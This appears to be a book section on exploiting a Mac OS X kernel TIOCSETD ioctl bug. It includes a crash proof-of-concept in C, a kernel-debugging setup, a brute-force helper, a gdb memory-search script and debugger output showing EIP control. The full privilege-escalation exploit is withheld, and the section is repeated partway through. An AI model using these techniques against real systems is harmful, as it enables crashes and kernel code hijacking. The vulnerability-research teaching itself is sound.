<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>7.2 Exploitation</title><link rel="stylesheet" href="core.css" type="text/css"/><meta name="generator" content="DocBook XSL Stylesheets V1.74.0"/></head><body><div class="sect1" title="7.2 Exploitation"><div class="titlepage"><div><div><h1 class="title"><a id="exploitation-id5"/>7.2 Exploitation</h1></div></div></div><p>After I found the bug, I did the following to gain control over <code class="literal">EIP</code>:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Step 1: Trigger the bug to crash the system (denial of service).</p></li><li class="listitem"><p>Step 2: Prepare a kernel-debugging environment.</p></li><li class="listitem"><p>Step 3: Connect the debugger to the target system.</p></li><li class="listitem"><p>Step 4: Get control over <code class="literal">EIP</code>.</p></li></ul></div><div class="sect2" title="Step 1: Trigger the Bug to Crash the System (Denial of Service)"><div class="titlepage"><div><div><h2 class="title"><a id="step_1_colon_trigger_the_bug_to_crash_th"/>Step 1: Trigger the Bug to Crash the System (Denial of Service)</h2></div></div></div><p>Once I had found the bug, it was easy to trigger it and cause a system crash. All I had to do was send a malformed <code class="literal">TIOCSETD</code> IOCTL request to the kernel. <a class="xref" href="ch07s02.html#poc_code_open_parenthesis-id1" title="Example 7-2. POC code (poc.c) I wrote to trigger the bug I found in the kernel of OS X">Example 7-2</a> shows the source code of the POC I developed to cause a crash.</p><div class="example"><a id="poc_code_open_parenthesis-id1"/><p class="title">Example 7-2. POC code (<span class="emphasis"><em>poc.c</em></span>) I wrote to trigger the bug I found in the kernel of OS X</p><div class="example-contents"><pre class="programlisting">01    #include &lt;sys/ioctl.h&gt;
02
03    int
04    main (void)
05    {
06       unsigned long    ldisc = 0xff000000;
07
08       ioctl (0, TIOCSETD, &amp;ldisc);
09
10       return 0;
11    }</pre></div></div><p>A brand-new MacBook: $1,149. An LED Cinema Display Monitor: $899. Crashing a Mac OS X system with only 11 lines of code: priceless.</p><p>I then compiled and tested the POC code as an unprivileged user:</p><a id="I_programlisting7_d1e8128"/><pre class="programlisting">osx$ <strong class="userinput"><code>uname -a</code></strong>
Darwin osx 8.8.3 Darwin Kernel Version 8.8.3: Wed
 Oct 18 21:57:10 PDT 2006;                            →
 root:xnu-792.15.4.obj~/RELEASE_I386 i386 i386

osx$ <strong class="userinput"><code>id</code></strong>
uid=502(seraph) gid=502(seraph) groups=502(seraph)

osx$ <strong class="userinput"><code>gcc -o poc poc.c</code></strong>

osx$ <strong class="userinput"><code>./poc</code></strong></pre><p>Immediately after executing the POC code, I got the standard crash screen of Mac OS X,<sup>[<a href="ch07s05.html#ftn.CHP-7-FN-2" class="footnoteref">76</a>]</sup> as shown in <a class="xref" href="ch07s02.html#mac_os_x_kernel_panic_message" title="Figure 7-2. Mac OS X kernel panic message">Figure 7-2</a>.</p><div class="figure"><a id="mac_os_x_kernel_panic_message"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject7_d1e8150"/><img src="httpatomoreillycomsourcenostarchimages939325.png.jpg" alt="Mac OS X kernel panic message"/></div></div><p class="title">Figure 7-2. Mac OS X kernel panic message</p></div><p>If such a kernel panic occurs, the details of the crash are added to a log file in the folder <span class="emphasis"><em>/Library/Logs/</em></span>. I rebooted the system and opened that file.<a id="IDX-CHP-7-0010" class="indexterm"/></p><a id="I_programlisting7_d1e8163"/><pre class="programlisting">osx$ <strong class="userinput"><code>cat /Library/Logs/panic.log</code></strong>
Sat Mar 3 13:30:58 2007
panic(cpu 0 caller 0x001A31CE): Unresolved kernel trap (CPU 0, Type
 14=page fault), registers:
CR0: 0x80010033, CR2: 0xe0456860, CR3: 0x00d8a000, CR4: 0x000006e0
EAX: 0xe0000000, EBX: 0xff000000, ECX: 0x04000001, EDX: 0x0386c380
CR2: 0xe0456860, EBP: 0x250e3d18, ESI: 0x042fbe04, EDI: 0x00000000
EFL: 0x00010287, EIP: 0x0035574c, CS:  0x00000008, DS:  0x004b0010

Backtrace, Format - Frame : Return Address (4 potential args on stack)
0x250e3a68 : 0x128d08 (0x3c9a14 0x250e3a8c 0x131de5 0x0)
0x250e3aa8 : 0x1a31ce (0x3cf6c8 0x0 0xe 0x3ceef8)
0x250e3bb8 : 0x19a874 (0x250e3bd0 0x1 0x0 0x42fbe04)
0x250e3d18 : 0x356efe (0x42fbe04 0x8004741b 0x250e3eb8 0x3)
0x250e3d68 : 0x1ef4de (0x4000001 0x8004741b 0x250e3eb8 0x3)
0x250e3da8 : 0x1e6360 (0x250e3dd0 0x297 0x250e3e08 0x402a1f4)
0x250e3e08 : 0x1de161 (0x3a88084 0x8004741b 0x250e3eb8 0x3)
0x250e3e58 : 0x330735 (0x4050440
*********</pre><p>It appeared that I could crash the system as an unprivileged user. Could I also execute arbitrary code in the privileged context of the OS X kernel? To answer that question, I had to peer inside the inner workings of the kernel.<a id="IDX-CHP-7-0011" class="indexterm"/><a id="IDX-CHP-7-0012" class="indexterm"/><a id="IDX-CHP-7-0013" class="indexterm"/><a id="IDX-CHP-7-0014" class="indexterm"/><a id="IDX-CHP-7-0015" class="indexterm"/></p></div><div class="sect2" title="Step 2: Prepare a Kernel-Debugging Environment"><div class="titlepage"><div><div><h2 class="title"><a id="step_2_colon_prepare_a_kernel-debugging"/>Step 2: Prepare a Kernel-Debugging Environment</h2></div></div></div><p>At this point I needed to be able to debug the kernel. As I mentioned earlier, this is no problem if you own two Macs, but I had only one MacBook at hand. Therefore, I had to find another way to debug the kernel. I solved the problem by building and installing Apple’s GNU debugger on a Linux host and then connecting the host to my MacBook. Instructions for building such a debugger host system are described in Section B.5.</p></div><div class="sect2" title="Step 3: Connect the Debugger to the Target System"><div class="titlepage"><div><div><h2 class="title"><a id="step_3_colon_connect_the_debugger_to_the"/>Step 3: Connect the Debugger to the Target System</h2></div></div></div><p>After I had built Apple’s gdb on a Linux host, I linked the systems with an Ethernet crossover cable, as shown in <a class="xref" href="ch07s02.html#my_setup_for_remotely_debugging_the_kern" title="Figure 7-3. My setup for remotely debugging the kernel of Mac OS X">Figure 7-3</a>.</p><div class="figure"><a id="my_setup_for_remotely_debugging_the_kern"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject7_d1e8204"/><img src="httpatomoreillycomsourcenostarchimages939327.png.jpg" alt="My setup for remotely debugging the kernel of Mac OS X"/></div></div><p class="title">Figure 7-3. My setup for remotely debugging the kernel of Mac OS X</p></div><p>I then started the Mac OS X target system, enabled remote kernel debugging, and rebooted the system so that the changes could take effect:<sup>[<a href="ch07s05.html#ftn.CHP-7-FN-3" class="footnoteref">77</a>]</sup><a id="IDX-CHP-7-0016" class="indexterm"/></p><a id="I_programlisting7_d1e8215"/><pre class="programlisting">osx$ <strong class="userinput"><code>sudo nvram boot-args="debug=0x14e"</code></strong>

osx$ <strong class="userinput"><code>sudo reboot</code></strong></pre><p>After the Mac OS X target machine had restarted, I booted the Linux host and made sure that I could connect to the target machine:</p><a id="I_programlisting7_d1e8224"/><pre class="programlisting">linux$ <strong class="userinput"><code>ping -c1 10.0.0.2</code></strong>
PING 10.0.0.2 (10.0.0.2) from 10.0.0.3 : 56(84) bytes of data.
64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=1.08 ms

--- 10.0.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% loss, time 0ms
rtt min/avg/max/mdev = 1.082/1.082/1.082/0.000 ms</pre><p>I added a permanent ARP entry for the target on the Linux system to establish a robust connection between the two machines, ensuring that the connection wouldn’t be dropped while the kernel of the target machine was being debugged:</p><a id="I_programlisting7_d1e8231"/><pre class="programlisting">linux$ <strong class="userinput"><code>su -</code></strong>
Password:

linux# <strong class="userinput"><code>arp -an</code></strong>
? (10.0.0.1) at 00:24:E8:A8:64:DA [ether] on eth0
? (10.0.0.2) at 00:17:F2:F0:47:19 [ether] on eth0

linux# <strong class="userinput"><code>arp -s 10.0.0.2 00:17:F2:F0:47:19</code></strong>

linux# <strong class="userinput"><code>arp -an</code></strong>
? (10.0.0.1) at 00:24:E8:A8:64:DA [ether] on eth0
? (10.0.0.2) at 00:17:F2:F0:47:19 [ether] <strong class="userinput"><code>PERM</code></strong> on eth0</pre><p>I then logged in to the Mac OS X system as an unprivileged user and generated a nonmaskable interrupt (NMI) by tapping the system’s power button. That gave me the following output on the screen of the MacBook:</p><a id="I_programlisting7_d1e8250"/><pre class="programlisting">Debugger called: &lt;Button SCI&gt;
Debugger called: &lt;Button SCI&gt;
cpu_interrupt: sending enter debugger signal (00000002) to cpu 1
ethernet MAC address: 00:17:f2:f0:47:19
ethernet MAC address: 00:17:f2:f0:47:19
ip address: 10.0.0.2
ip address: 10.0.0.2

Waiting for remote debugger connection.</pre><p>Back on the Linux host, I started the kernel debugger (see Section B.5 for more information on how to build this gdb version):</p><a id="I_programlisting7_d1e8255"/><pre class="programlisting">linux# <strong class="userinput"><code>gdb_osx KernelDebugKit_10.4.8/mach_kernel</code></strong>
GNU gdb 2003-01-28-cvs (Mon Mar  5 16:54:25 UTC 2007)
Copyright 2003 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "--host= --target=i386-apple-darwin".</pre><p>I then instructed the debugger to use Apple’s kernel debug protocol (kdp):</p><a id="I_programlisting7_d1e8262"/><pre class="programlisting">(gdb) <strong class="userinput"><code>target remote-kdp</code></strong></pre><p>Once the debugger was running, I attached to the kernel of the target system for the first time:</p><a id="I_programlisting7_d1e8268"/><pre class="programlisting">(gdb) <strong class="userinput"><code>attach 10.0.0.2</code></strong>
Connected.
0x001a8733 in lapic_dump () at /SourceCache/xnu/xnu-792.13.8/osfmk/i386/mp.c:332
332             int     i;</pre><p>As the debugger output shows, it seemed to work! The OS X system was frozen at that time, so I continued the execution of the kernel with the following debugger command:</p><a id="I_programlisting7_d1e8275"/><pre class="programlisting">(gdb) <strong class="userinput"><code>continue</code></strong>
Continuing.</pre><p>Now everything was set up for remotely debugging the kernel of the Mac OS X target system.</p></div><div class="sect2" title="Step 4: Get Control over EIP"><div class="titlepage"><div><div><h2 class="title"><a id="step_4_colon_get_control_over_eip"/>Step 4: Get Control over EIP</h2></div></div></div><p>After I had successfully connected the debugger to the kernel of the target system, I opened a terminal on the Mac OS X machine and again executed the POC code described in <a class="xref" href="ch07s02.html#poc_code_open_parenthesis-id1" title="Example 7-2. POC code (poc.c) I wrote to trigger the bug I found in the kernel of OS X">Example 7-2</a>:</p><a id="I_programlisting7_d1e8289"/><pre class="programlisting">osx$ <strong class="userinput"><code>id</code></strong>
uid=502(seraph) gid=502(seraph) groups=502(seraph)

osx$ <strong class="userinput"><code>./poc</code></strong></pre><p>The OS X system froze immediately, and I got the following debugger output on the Linux host:<a id="IDX-CHP-7-0017" class="indexterm"/></p><a id="I_programlisting7_d1e8301"/><pre class="programlisting">Program received signal SIGTRAP, Trace/breakpoint trap.
0x0035574c in ttsetcompat (tp=0x37e0804, com=0x8004741b,
 data=0x2522beb8 "",                     → term=0x3)
 at /SourceCache/xnu/xnu-792.13.8/bsd/kern/tty_compat.c:145
145      */</pre><p>To see what exactly caused the <code class="literal">SIGTRAP</code> signal, I looked at the last executed kernel instruction (see Section B.4 for a description of the following debugger commands):</p><a id="I_programlisting7_d1e8308"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/1i $eip</code></strong>
0x35574c &lt;ttsetcompat+138&gt;:     call   *0x456860(%eax)</pre><p>Apparently, the crash occurred when the kernel tried to call an address referenced by the <code class="literal">EAX</code> register. Next, I looked at the register values:</p><a id="I_programlisting7_d1e8318"/><pre class="programlisting">(gdb) <strong class="userinput"><code>info registers</code></strong>
<strong class="userinput"><code>eax            0xe0000000</code></strong>       −536870912
ecx            0x4000001        67108865
edx            0x386c380        59163520
ebx            0xff000000       −16777216
esp            0x2522bc18       0x2522bc18
ebp            0x2522bd18       0x2522bd18
esi            0x37e0804        58591236
edi            0x0              0
eip            0x35574c         0x35574c
eflags         0x10287          66183
cs             0x8              8
ss             0x10             16
ds             0x4b0010         4915216
es             0x340010         3407888
fs             0x25220010       622985232
gs             0x48             72</pre><p>The debugger output shows that <code class="literal">EAX</code> had a value of <code class="literal">0xe0000000</code>. It wasn’t apparent to me where this value came from, so I disassembled the instructions around <code class="literal">EIP</code>:</p><a id="I_programlisting7_d1e8337"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/6i $eip - 15</code></strong>
<strong class="userinput"><code>0x35573d &lt;ttsetcompat+123&gt;:     mov    %ebx,%eax</code></strong>
<strong class="userinput"><code>0x35573f &lt;ttsetcompat+125&gt;:     shl    $0x5,%eax</code></strong>
0x355742 &lt;ttsetcompat+128&gt;:     mov    %esi,0x4(%esp,1)
0x355746 &lt;ttsetcompat+132&gt;:     mov    0xffffffa8(%ebp),%ecx
0x355749 &lt;ttsetcompat+135&gt;:     mov    %ecx,(%esp,1)
<strong class="userinput"><code>0x35574c &lt;ttsetcompat+138&gt;:     call   *0x456860(%eax)</code></strong></pre><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Note that the disassembly is in AT&amp;T style</em></span>.<a id="IDX-CHP-7-0018" class="indexterm"/></p></div><p>At address <code class="literal">0x35573d</code>, the value of <code class="literal">EBX</code> is copied into <code class="literal">EAX</code>. The next instruction modifies this value by a left shift of 5 bits. At address <code class="literal">0x35574c</code>, the value is used to calculate the operand of the <code class="literal">call</code> instruction. So where did the value of <code class="literal">EBX</code> come from? A quick look at the register values revealed that <code class="literal">EBX</code> was holding the value <code class="literal">0xff000000</code>, the value I had supplied as input data for the <code class="literal">TIOCSETD</code> IOCTL. The value <code class="literal">0xe0000000</code> was the result of a left shift of my supplied input value by 5 bits. As expected, I was able to control the memory location used to find the new value for the <code class="literal">EIP</code> register. The modification of my supplied input data can be expressed as<a id="IDX-CHP-7-0019" class="indexterm"/></p><a id="I_programlisting7_d1e8401"/><pre class="programlisting">address of the new value for EIP = (IOCTL input data value &lt;&lt; 5) + 0x456860</pre><p>I could get an appropriate <code class="literal">TIOCSETD</code> input data value for a specific memory address in either of two ways: I could try to solve the mathematical problem, or I could brute force the value. I decided to go with the easy option and wrote the following program to brute force the value:</p><div class="example"><a id="code_that_i_wrote_to_brute_force_the"/><p class="title">Example 7-3. Code that I wrote to brute force the <code class="literal">TIOCSETD</code> input data value (<span class="emphasis"><em>addr_brute_force.c</em></span>)</p><div class="example-contents"><pre class="programlisting">01    #include &lt;stdio.h&gt;
02
03    #define MEMLOC          0x10203040
04    #define SEARCH_START    0x80000000
05    #define SEARCH_END      0xffffffff
06
07    int
08    main (void)
09    {
10       unsigned int    a, b = 0;
11
12       for (a = SEARCH_START; a &lt; SEARCH_END; a++) {
13           b = (a &lt;&lt; 5) + 0x456860;
14           if (b == MEMLOC) {
15               printf ("Value: %08x\n", a);
16               return 0;
17           }
18       }
19
20       printf ("No valid value found.\n");
21
22       return 1;
23    }</pre></div></div><p>I wrote this program to answer this question: What <code class="literal">TIOCSETD</code> input data do I have to send to the kernel in order to get the value at memory address <code class="literal">0x10203040</code> copied into the <code class="literal">EIP</code> register?</p><a id="I_programlisting7_d1e8430"/><pre class="programlisting">osx$ <strong class="userinput"><code>gcc -o addr_brute_force addr_brute_force.c</code></strong>
osx$ <strong class="userinput"><code>./addr_brute_force</code></strong>
Value: 807ed63f</pre><p>If <code class="literal">0x10203040</code> pointed to the value I wanted copied into <code class="literal">EIP</code>, I had to supply the value <code class="literal">0x807ed63f</code> as an input for the <code class="literal">TIOCSETD</code> IOCTL.</p><p>I then tried to manipulate <code class="literal">EIP</code> to make it point to address <code class="literal">0x65656565</code>. To achieve this, I had to find a memory location in the kernel that pointed to that value. To find suitable memory locations in the kernel, I wrote the following gdb script:</p><div class="example"><a id="a_script_for_finding_memory_locations"/><p class="title">Example 7-4. A script for finding memory locations in the kernel that point to a special byte pattern (<span class="emphasis"><em>search_memloc.gdb</em></span>)</p><div class="example-contents"><pre class="programlisting">01    set $MAX_ADDR = 0x00600000
02
03    define my_ascii
04      if $argc != 1
05        printf "ERROR: my_ascii"
06      else
07        set $tmp = *(unsigned char *)($arg0)
08        if ($tmp &lt; 0x20 || $tmp &gt; 0x7E)
09          printf "."
10        else
11          printf "%c", $tmp
12        end
13      end
14    end
15
16    define my_hex
17      if $argc != 1
18        printf "ERROR: my_hex"
19      else
20        printf "%02X%02X%02X%02X ", \
21          *(unsigned char*)($arg0 + 3), *(unsigned char*)($arg0 + 2),     \
22          *(unsigned char*)($arg0 + 1), *(unsigned char*)($arg0 + 0)
23      end
24    end
25
26    define hexdump
27      if $argc != 2
28        printf "ERROR: hexdump"
29      else
30        if ((*(unsigned char*)($arg0 + 0) == (unsigned char)($arg1 &gt;&gt;  0)))
31          if ((*(unsigned char*)($arg0 + 1) == (unsigned char)($arg1 &gt;&gt;  8)))
32            if ((*(unsigned char*)($arg0 + 2) == (unsigned char)($arg1 &gt;&gt; 16)))
33              if ((*(unsigned char*)($arg0 + 3) == (unsigned char)($arg1 &gt;&gt; 24)))
34                printf "%08X : ", $arg0
35                my_hex $arg0
36                my_ascii $arg0+0x3
37                my_ascii $arg0+0x2
38                my_ascii $arg0+0x1
39                my_ascii $arg0+0x0
40                printf "\n"
41              end
42            end
43          end
44        end
45      end
46    end
47
48    define search_memloc
49      set $max_addr = $MAX_ADDR
50      set $counter = 0
51      if $argc != 2
52        help search_memloc
53      else
54        while (($arg0 + $counter) &lt;= $max_addr)
55          set $addr = $arg0 + $counter
56          hexdump $addr $arg1
57          set $counter = $counter + 0x20
58        end
59      end
60    end
61    document search_memloc
62    Search a kernel memory location that points to PATTERN.
63    Usage: search_memloc ADDRESS PATTERN
64    ADDRESS - address to start the search
65    PATTERN - pattern to search for
66    end</pre></div></div><p>The gdb script from <a class="xref" href="ch07s02.html#a_script_for_finding_memory_locations" title="Example 7-4. A script for finding memory locations in the kernel that point to a special byte pattern (search_memloc.gdb)">Example 7-4</a> takes two arguments: the address from where to start the search and the pattern to search for. I wanted to find a memory location that pointed to the value <code class="literal">0x65656565</code>, so I used the script in the following way:</p><a id="I_programlisting7_d1e8476"/><pre class="programlisting">(gdb) <strong class="userinput"><code>source search_memloc.gdb</code></strong>
(gdb) <strong class="userinput"><code>search_memloc 0x400000 0x65656565</code></strong>
0041BDA0 : 65656565 eeee
0041BDC0 : 65656565 eeee
0041BDE0 : 65656565 eeee
0041BE00 : 65656565 eeee
0041BE20 : 65656565 eeee
0041BE40 : 65656565 eeee
0041BE60 : 65656565 eeee
0041BE80 : 65656565 eeee
0041BEA0 : 65656565 eeee
0041BEC0 : 65656565 eeee
00459A00 : 65656565 eeee
00459A20 : 65656565 eeee
00459A40 : 65656565 eeee
00459A60 : 65656565 eeee
00459A80 : 65656565 eeee
00459AA0 : 65656565 eeee
00459AC0 : 65656565 eeee
00459AE0 : 65656565 eeee
00459B00 : 65656565 eeee
00459B20 : 65656565 eeee
Cannot access memory at address 0x4dc000</pre><p>The output shows the memory locations found by the script that point to the value <code class="literal">0x65656565</code>. I picked the first one from the list, adjusted the <code class="literal">MEMLOC</code> defined in line 3 of <a class="xref" href="ch07s02.html#code_that_i_wrote_to_brute_force_the" title="Example 7-3. Code that I wrote to brute force the TIOCSETD input data value (addr_brute_force.c)">Example 7-3</a>, and let the program determine the appropriate <code class="literal">TIOCSETD</code> input value:</p><a id="I_programlisting7_d1e8497"/><pre class="programlisting">osx$ <strong class="userinput"><code>head −3 addr_brute_force.c</code></strong>
#include &lt;stdio.h&gt;

#define MEMLOC    <strong class="userinput"><code>0x0041bda0</code></strong>

osx$ <strong class="userinput"><code>gcc -o addr_brute_force addr_brute_force.c</code></strong>

osx$ <strong class="userinput"><code>./addr_brute_force</code></strong>
Value: 87ffe2aa</pre><p>I then changed the IOCTL input value in the POC code illustrated in <a class="xref" href="ch07s02.html#poc_code_open_parenthesis-id1" title="Example 7-2. POC code (poc.c) I wrote to trigger the bug I found in the kernel of OS X">Example 7-2</a>, connected the kernel debugger to OS X, and executed the code:</p><a id="I_programlisting7_d1e8515"/><pre class="programlisting">osx$ <strong class="userinput"><code>head −6 poc.c</code></strong>
#include &lt;sys/ioctl.h&gt;

int
main (void)
{
      unsigned long     ldisc = <strong class="userinput"><code>0x87ffe2aa</code></strong>;

osx$ <strong class="userinput"><code>gcc -o poc poc.c</code></strong>

osx$ <strong class="userinput"><code>./poc</code></strong></pre><p>The OS X machine froze again, and the debugger on the Linux host displayed the following output:</p><a id="I_programlisting7_d1e8530"/><pre class="programlisting">Program received signal SIGTRAP, Trace/breakpoint trap.
<strong class="userinput"><code>0x65656565 in ?? ()</code></strong>

(gdb) <strong class="userinput"><code>info registers</code></strong>
eax            0xfffc5540       −240320
ecx            0x4000001        67108865
edx            0x386c380        59163520
ebx            0x87ffe2aa       −2013273430
esp            0x250dbc08       0x250dbc08
ebp            0x250dbd18       0x250dbd18
esi            0x3e59604        65377796
edi            0x0              0
<strong class="userinput"><code>eip            0x65656565       0x65656565</code></strong>
eflags         0x10282          66178
cs             0x8              8
ss             0x10             16
ds             0x3e50010        65339408
es             0x3e50010        65339408
fs             0x10             16
gs             0x48             72</pre><p>As the debugger output shows, the <code class="literal">EIP</code> register now had a value of <code class="literal">0x65656565</code>. At this point I was able to control <code class="literal">EIP</code>, but exploiting the bug to achieve arbitrary code execution at the kernel level was still a challenge. Under OS X, including Leopard, the kernel isn’t mapped into every user space process; it has its own virtual address space. It’s therefore impossible to return to a user space address using common strategies for Linux or Windows. I solved this problem by heap spraying the kernel with my privilege escalation payload and a reference to this payload. I achieved this by exploiting a memory leak in the kernel of OS X. Then I calculated an appropriate <code class="literal">TIOCSETD</code> input value that pointed to the payload reference. This value was then copied into <code class="literal">EIP</code> and . . . bingo!<a id="IDX-CHP-7-0020" class="indexterm"/><a id="IDX-CHP-7-0021" class="indexterm"/><a id="IDX-CHP-7-0022" class="indexterm"/><a id="IDX-CHP-7-0023" class="indexterm"/><a id="IDX-CHP-7-0024" class="indexterm"/></p><p>Providing you with a full working exploit would be against the law, but if you are interested, you can watch a short video I recorded that shows the exploit in action on the book’s website.<sup>[<a href="ch07s05.html#ftn.CHP-7-FN-4" class="footnoteref">78</a>]</sup></p></div></div></body></html>
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>7.2 Exploitation</title><link rel="stylesheet" href="core.css" type="text/css"/><meta name="generator" content="DocBook XSL Stylesheets V1.74.0"/></head><body><div class="sect1" title="7.2 Exploitation"><div class="titlepage"><div><div><h1 class="title"><a id="exploitation-id5"/>7.2 Exploitation</h1></div></div></div><p>After I found the bug, I did the following to gain control over <code class="literal">EIP</code>:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Step 1: Trigger the bug to crash the system (denial of service).</p></li><li class="listitem"><p>Step 2: Prepare a kernel-debugging environment.</p></li><li class="listitem"><p>Step 3: Connect the debugger to the target system.</p></li><li class="listitem"><p>Step 4: Get control over <code class="literal">EIP</code>.</p></li></ul></div><div class="sect2" title="Step 1: Trigger the Bug to Crash the System (Denial of Service)"><div class="titlepage"><div><div><h2 class="title"><a id="step_1_colon_trigger_the_bug_to_crash_th"/>Step 1: Trigger the Bug to Crash the System (Denial of Service)</h2></div></div></div><p>Once I had found the bug, it was easy to trigger it and cause a system crash. All I had to do was send a malformed <code class="literal">TIOCSETD</code> IOCTL request to the kernel. <a class="xref" href="ch07s02.html#poc_code_open_parenthesis-id1" title="Example 7-2. POC code (poc.c) I wrote to trigger the bug I found in the kernel of OS X">Example 7-2</a> shows the source code of the POC I developed to cause a crash.</p><div class="example"><a id="poc_code_open_parenthesis-id1"/><p class="title">Example 7-2. POC code (<span class="emphasis"><em>poc.c</em></span>) I wrote to trigger the bug I found in the kernel of OS X</p><div class="example-contents"><pre class="programlisting">01    #include &lt;sys/ioctl.h&gt;
02
03    int
04    main (void)
05    {
06       unsigned long    ldisc = 0xff000000;
07
08       ioctl (0, TIOCSETD, &amp;ldisc);
09
10       return 0;
11    }</pre></div></div><p>A brand-new MacBook: $1,149. An LED Cinema Display Monitor: $899. Crashing a Mac OS X system with only 11 lines of code: priceless.</p><p>I then compiled and tested the POC code as an unprivileged user:</p><a id="I_programlisting7_d1e8128"/><pre class="programlisting">osx$ <strong class="userinput"><code>uname -a</code></strong>
Darwin osx 8.8.3 Darwin Kernel Version 8.8.3: Wed
 Oct 18 21:57:10 PDT 2006;                            →
 root:xnu-792.15.4.obj~/RELEASE_I386 i386 i386

osx$ <strong class="userinput"><code>id</code></strong>
uid=502(seraph) gid=502(seraph) groups=502(seraph)

osx$ <strong class="userinput"><code>gcc -o poc poc.c</code></strong>

osx$ <strong class="userinput"><code>./poc</code></strong></pre><p>Immediately after executing the POC code, I got the standard crash screen of Mac OS X,<sup>[<a href="ch07s05.html#ftn.CHP-7-FN-2" class="footnoteref">76</a>]</sup> as shown in <a class="xref" href="ch07s02.html#mac_os_x_kernel_panic_message" title="Figure 7-2. Mac OS X kernel panic message">Figure 7-2</a>.</p><div class="figure"><a id="mac_os_x_kernel_panic_message"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject7_d1e8150"/><img src="httpatomoreillycomsourcenostarchimages939325.png.jpg" alt="Mac OS X kernel panic message"/></div></div><p class="title">Figure 7-2. Mac OS X kernel panic message</p></div><p>If such a kernel panic occurs, the details of the crash are added to a log file in the folder <span class="emphasis"><em>/Library/Logs/</em></span>. I rebooted the system and opened that file.<a id="IDX-CHP-7-0010" class="indexterm"/></p><a id="I_programlisting7_d1e8163"/><pre class="programlisting">osx$ <strong class="userinput"><code>cat /Library/Logs/panic.log</code></strong>
Sat Mar 3 13:30:58 2007
panic(cpu 0 caller 0x001A31CE): Unresolved kernel trap (CPU 0, Type
 14=page fault), registers:
CR0: 0x80010033, CR2: 0xe0456860, CR3: 0x00d8a000, CR4: 0x000006e0
EAX: 0xe0000000, EBX: 0xff000000, ECX: 0x04000001, EDX: 0x0386c380
CR2: 0xe0456860, EBP: 0x250e3d18, ESI: 0x042fbe04, EDI: 0x00000000
EFL: 0x00010287, EIP: 0x0035574c, CS:  0x00000008, DS:  0x004b0010

Backtrace, Format - Frame : Return Address (4 potential args on stack)
0x250e3a68 : 0x128d08 (0x3c9a14 0x250e3a8c 0x131de5 0x0)
0x250e3aa8 : 0x1a31ce (0x3cf6c8 0x0 0xe 0x3ceef8)
0x250e3bb8 : 0x19a874 (0x250e3bd0 0x1 0x0 0x42fbe04)
0x250e3d18 : 0x356efe (0x42fbe04 0x8004741b 0x250e3eb8 0x3)
0x250e3d68 : 0x1ef4de (0x4000001 0x8004741b 0x250e3eb8 0x3)
0x250e3da8 : 0x1e6360 (0x250e3dd0 0x297 0x250e3e08 0x402a1f4)
0x250e3e08 : 0x1de161 (0x3a88084 0x8004741b 0x250e3eb8 0x3)
0x250e3e58 : 0x330735 (0x4050440
*********</pre><p>It appeared that I could crash the system as an unprivileged user. Could I also execute arbitrary code in the privileged context of the OS X kernel? To answer that question, I had to peer inside the inner workings of the kernel.<a id="IDX-CHP-7-0011" class="indexterm"/><a id="IDX-CHP-7-0012" class="indexterm"/><a id="IDX-CHP-7-0013" class="indexterm"/><a id="IDX-CHP-7-0014" class="indexterm"/><a id="IDX-CHP-7-0015" class="indexterm"/></p></div><div class="sect2" title="Step 2: Prepare a Kernel-Debugging Environment"><div class="titlepage"><div><div><h2 class="title"><a id="step_2_colon_prepare_a_kernel-debugging"/>Step 2: Prepare a Kernel-Debugging Environment</h2></div></div></div><p>At this point I needed to be able to debug the kernel. As I mentioned earlier, this is no problem if you own two Macs, but I had only one MacBook at hand. Therefore, I had to find another way to debug the kernel. I solved the problem by building and installing Apple’s GNU debugger on a Linux host and then connecting the host to my MacBook. Instructions for building such a debugger host system are described in Section B.5.</p></div><div class="sect2" title="Step 3: Connect the Debugger to the Target System"><div class="titlepage"><div><div><h2 class="title"><a id="step_3_colon_connect_the_debugger_to_the"/>Step 3: Connect the Debugger to the Target System</h2></div></div></div><p>After I had built Apple’s gdb on a Linux host, I linked the systems with an Ethernet crossover cable, as shown in <a class="xref" href="ch07s02.html#my_setup_for_remotely_debugging_the_kern" title="Figure 7-3. My setup for remotely debugging the kernel of Mac OS X">Figure 7-3</a>.</p><div class="figure"><a id="my_setup_for_remotely_debugging_the_kern"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject7_d1e8204"/><img src="httpatomoreillycomsourcenostarchimages939327.png.jpg" alt="My setup for remotely debugging the kernel of Mac OS X"/></div></div><p class="title">Figure 7-3. My setup for remotely debugging the kernel of Mac OS X</p></div><p>I then started the Mac OS X target system, enabled remote kernel debugging, and rebooted the system so that the changes could take effect:<sup>[<a href="ch07s05.html#ftn.CHP-7-FN-3" class="footnoteref">77</a>]</sup><a id="IDX-CHP-7-0016" class="indexterm"/></p><a id="I_programlisting7_d1e8215"/><pre class="programlisting">osx$ <strong class="userinput"><code>sudo nvram boot-args="debug=0x14e"</code></strong>

osx$ <strong class="userinput"><code>sudo reboot</code></strong></pre><p>After the Mac OS X target machine had restarted, I booted the Linux host and made sure that I could connect to the target machine:</p><a id="I_programlisting7_d1e8224"/><pre class="programlisting">linux$ <strong class="userinput"><code>ping -c1 10.0.0.2</code></strong>
PING 10.0.0.2 (10.0.0.2) from 10.0.0.3 : 56(84) bytes of data.
